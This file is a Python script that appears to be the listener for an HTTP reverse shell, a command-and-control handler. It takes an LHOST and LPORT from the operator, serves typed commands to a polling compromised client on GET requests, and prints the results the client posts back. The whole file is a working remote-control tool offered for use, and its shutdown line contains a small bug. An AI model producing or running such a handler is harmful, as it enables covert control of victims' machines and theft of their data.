#!/usr/bin/env python3

import http.server
import cgi
import os

class Handler(http.server.BaseHTTPRequestHandler):
    #
    def do_GET(self):
        #
        command = input(">")
        #
        self.send_response(200)
        #
        self.send_header("Content-type","text/html")
        #
        self.end_headers()
        #
        self.wfile.write(command.encode())

    def do_POST(self):
        #
        self.send_response(200)
        #
        self.end_headers()
        #
        length = int(self.headers['Content-length']) # Length in bytes of HTTP Post Request
        #
        PostVariable = self.rfile.read(length)
        #
        print(PostVariable.decode())

if(__name__ == '__main__'):
    #
    print("[*] HTTP Server Handler Module [*]")
    #
    HOST = input("[+] Enter the LHOST-> ")
    #
    PORT = int(input("[+] Enter the LPORT-> "))
    #
    ServerClass = http.server.HTTPServer
    #
    httpd = ServerClass((HOST,PORT), Handler)
    #
    try:
        #
        httpd.serve_forever()
        #
    except KeyboardInterrupt:
        #
        print("[!] Server Process Terminated [!]")
        #
        http.server_close()
